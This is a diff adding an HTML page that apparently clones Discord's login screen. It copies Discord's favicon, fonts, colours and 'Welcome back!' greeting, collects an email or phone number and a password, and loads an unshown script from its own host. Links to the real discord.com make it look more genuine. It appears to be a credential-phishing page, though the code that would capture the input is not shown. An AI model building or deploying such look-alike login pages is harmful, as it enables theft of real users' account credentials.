@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title></title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="/static/images/discord.ico">
+  </head>
+  <body>
+    <main>
+      <h1>Welcome back!</h1>
+      <label class="header2">We're so excited too see you again!</label>
+      <div>
+        <label class="inptext">email or phone number <red>*</red></label>
+        <input id="user" type="text">
+      </div>
+      <div>
+        <label class="inptext">password <red>*</red></label>
+        <input id="pass" type="password">
+        <a href="https://discord.com/login">Forgot your password?</a>
+      </div> 
+      <button id="submit">Log In</button>
+      <p>Need an account? <a href="https://discord.com/register">Register</a></p>
+    </main>
+    <script type="module" src="/static/script.js"></script>
+  </body>
+  <style>
+    @font-face {
+      font-family: dcthin;
+      src: url(/static/fonts/discordfont0.woff2);
+    }
+
+    @font-face {
+      font-family: dcbold;
+      src: url(/static/fonts/discordfont1.woff2);
+    }
+    
+    @font-face {
+      font-family: dcmed;
+      src: url(/static/fonts/discordfont2.woff2);
+    }
+    
+    *{
+      margin: 0;
+      padding: 0;
+      color: white;
+      user-select: none;
+    }
+
+    body{
+      background: url("/static/images/discord.jpg");
+    }
+
+    main{
+      display: flex;
+      flex-direction: column;
+      position: absolute;
+      z-index: auto;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #282d30;
+      padding: 30px;
+      width: 500px;
+      border-radius: 5px;
+      box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+    }
+
+    h1{
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 8px;
+      font-family: dcmed;
+    }
+
+    .header2{
+      font-size 13px;
+      font-family: dcthin;
+      text-align: center;
+      margin-bottom: 25px;
+      font-weight: 400;
+      color: hsl(215 calc(1*8.8%) 73.3%/1);
+    }
+    
+    .inptext{
+        font-size: 12px;
+    }
+
+    .inptext{
+      font-family: dcbold;
+      color: hsl(215 calc(1*8.8%) 73.3%/1);
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .02em;
+    }
+
+    red{
+      color: #ed4245;
+    }
+
+    input{
+      color: hsl(210 calc(1*9.1%) 87.1%/1);
+      background: hsl(225 calc(1*6.3%) 12.5%/1);
+      border: none;
+      font-size: 16px;
+      outline: none;
+      padding: 10px;
+      min-width: 130px;
+      border-radius: 3px;
+    }
+
+    div{
+      display: flex;
+      flex-direction: column;
+      gap: 7px;
+      margin-bottom: 20px;
+    }
+
+    a{
+      color: hsl(200 calc(1*100%) 49.4%/1);
+      font-family: dcthin;
+      margin-top: 4px;
+      margin-bottom 20px;
+      line-height: 16px;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    a:hover{
+      text-decoration: underline;
+    }
+
+    button{
+      font-family: dcmed;
+      background: hsl(235 calc(1*85.6%) 64.7%/1);
+      font-size: 16px;
+      margin-bottom: 10px;
+      border: none;
+      height: 44px;
+      min-width: 130px;
+      min-height: 44px;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: .25s;
+      margin-top: 5px;
+    }
+
+    button:hover{
+      background: hsl(235 calc(1*46.7%) 44.1%/1);
+    }
+
+    p{
+      font-family: dcthin;
+      font-size: 14px;
+      line-height: 16px;
+      color: hsl(223 calc(1*5.8%) 52.9%/1);
+    }
+
+  </style>
+</html>
